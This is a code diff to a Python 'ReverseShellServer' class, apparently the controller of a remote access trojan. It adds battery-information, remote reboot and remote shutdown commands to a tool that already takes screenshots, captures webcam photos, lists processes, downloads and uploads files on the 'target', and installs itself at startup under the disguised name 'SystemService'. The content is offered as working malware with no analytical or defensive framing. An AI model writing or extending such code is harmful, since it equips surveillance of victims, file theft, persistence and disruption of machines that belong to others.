@@ -222,6 +222,20 @@ class ReverseShellServer:
             elif not isinstance(value, (dict, list)):
                 print(f"  {key.upper()}: {value}")
 
+    def display_battery_info(self, battery_info):
+        print("\n" + "="*50)
+        print("BATTERY INFORMATION")
+        print("="*50)
+        
+        for key, value in battery_info.items():
+            if key == "wmi_details" and value != "WMI info not available":
+                print(f"\n  WMI Details:")
+                for line in value.split('\n')[1:]:
+                    if line.strip():
+                        print(f"    {line.strip()}")
+            elif key != "wmi_details":
+                print(f"  {key.upper()}: {value}")
+
     def display_process_list(self, processes):
         print("\n" + "="*50)
         print("RUNNING PROCESSES (Top 50)")
@@ -305,10 +319,13 @@ class ReverseShellServer:
         print("screenshot        - Take screenshot")
         print("list_cam          - List available cameras")
         print("cam [index]       - Take photo from camera (default: 0)")
+        print("battery           - Battery information")
         print("processes         - List running processes")
         print("network           - Network information")
         print("download <path>   - Download file from target")
         print("upload <local_file> [remote_path] - Upload file to target")
+        print("reboot            - Reboot target system")
+        print("shutdown          - Shutdown target system")
         print("startup           - Add to startup")
         print("startup_remove    - Remove from startup")
         print("startup_status    - Check startup status")
@@ -391,6 +408,17 @@ class ReverseShellServer:
         elif command.lower().startswith('upload '):
             return self.handle_upload_command(client_sock, command)
         
+        elif command.lower() == 'battery':
+            self.send_encrypted(client_sock, {"type": "battery"})
+        
+        elif command.lower() == 'reboot':
+            print("[!] Rebooting target system...")
+            self.send_encrypted(client_sock, {"type": "reboot"})
+        
+        elif command.lower() == 'shutdown':
+            print("[!] Shutting down target system...")
+            self.send_encrypted(client_sock, {"type": "shutdown"})
+        
         elif command.lower() == 'startup':
             self.send_encrypted(client_sock, {"type": "add_to_startup", "startup_name": "SystemService"})
         
@@ -468,6 +496,24 @@ class ReverseShellServer:
                     print(f"[+] {result['message']}")
                 elif "error" in result:
                     print(f"[-] Upload error: {result['error']}")
+            elif "battery_result" in response:
+                result = response["battery_result"]
+                if "battery_info" in result:
+                    self.display_battery_info(result["battery_info"])
+                elif "error" in result:
+                    print(f"[-] Battery info error: {result['error']}")
+            elif "reboot_result" in response:
+                result = response["reboot_result"]
+                if "output" in result:
+                    print(f"[+] {result['output']}")
+                elif "error" in result:
+                    print(f"[-] Reboot error: {result['error']}")
+            elif "shutdown_result" in response:
+                result = response["shutdown_result"]
+                if "output" in result:
+                    print(f"[+] {result['output']}")
+                elif "error" in result:
+                    print(f"[-] Shutdown error: {result['error']}")
             elif "startup_result" in response:
                 result = response["startup_result"]
                 if "success" in result:
